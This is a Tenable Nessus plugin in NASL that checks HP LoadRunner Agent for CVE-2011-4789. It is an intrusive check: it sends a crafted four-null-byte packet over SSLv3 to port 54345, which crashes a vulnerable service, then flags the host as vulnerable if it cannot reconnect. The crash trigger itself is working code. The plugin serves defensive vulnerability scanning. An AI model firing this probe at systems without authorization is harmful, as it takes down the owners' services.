
#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(62902);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2012/11/14 21:57:53 $");

  script_cve_id("CVE-2011-4789");
  script_bugtraq_id(51398);
  script_osvdb_id(78309);

  script_name(english:"HP LoadRunner < 11.00 Patch 4 Code Execution (intrusive check)");
  script_summary(english:"Checks response from HP Load Runner Agent");

  script_set_attribute(attribute:"synopsis", value:
"The remote Windows host has a software performance testing application
that is affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of HP LoadRunner hosted on the remote Windows host is
potentially affected by a code execution vulnerability.  The application
fails to properly handle incoming packets with '0x00000000' as the first
32-bit value.  A remote, unauthenticated attacker, exploiting this flaw,
could execute arbitrary code on the remote host subject to the
privileges of the user running the affected application. 

This plugin sends crafted packets to the LoadRunner Agent service, which
will crash a vulnerable instance.  If it is successful, a manual restart
of the service is necessary.");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-12-016/");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/522928/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b6425436");
  script_set_attribute(attribute:"solution", value:"Upgrade to HP LoadRunner 11.00 Patch 4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'HP Diagnostics Server magentservice.exe Overflow');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/01/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/05/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/11/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:loadrunner");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2012 Tenable Network Security, Inc.");

  script_dependencies('loadrunner_agent_detect.nasl', 'ssl_supported_versions.nasl', 'os_fingerprint.nasl');
  script_require_keys('SSL/Supported');
  script_require_ports('Services/loadrunner_agent', 54345);
  
  exit(0);
}

include('audit.inc');
include('byte_func.inc');
include('global_settings.inc');
include('misc_func.inc');


#
# HPSBMU02785 SSRT100526 says only HP LoadRunner running on Windows is affected
#
if (report_paranoia < 2)
{
  os = get_kb_item_or_exit('Host/OS');
  if ('Windows' >!< os) audit(AUDIT_OS_NOT, 'Windows');
}

port = get_service(svc:'loadrunner_agent', default:54345, exit_on_fail:TRUE);

# 
# The attack appears to work on SSLv3 only
# Check for SSLv3 on remote port
ssl3 = 0;
list = get_kb_list('SSL/Transport/'+port);
if (!isnull(list))
{
  list = make_list(list);
  foreach encap (list)
  {
    if(encap == ENCAPS_SSLv3)
    {
      ssl3 = 1;
      break;
    }
  }
}

if (!ssl3) exit(0, 'The service listening on port '+port+' does not appear to support SSL 3.0.'); 

if (!get_port_state(port))  audit(AUDIT_PORT_CLOSED, port, 'TCP');

soc = open_sock_tcp(port, transport: ENCAPS_SSLv3);
if (!soc) audit(AUDIT_SOCK_FAIL, port, 'TCP');  


send(socket:soc, data:'\x00\x00\x00\x00');
# Wait a bit before closing the socket so that the remote end can read on a still open socket.
# Closing the socket immediately after the send may cause SSL_Read() on the remote host to fail
# because Nessus has just closed the connection. 
recv(socket:soc, length:1024);
close(soc);

# Vulnerable server should be dead now
soc = open_sock_tcp(port, transport: ENCAPS_SSLv3);
if (!soc) security_hole(port:port);

# We should be able to reconnect to the patched server
else audit(AUDIT_LISTEN_NOT_VULN, 'HP LoadRunner', port);
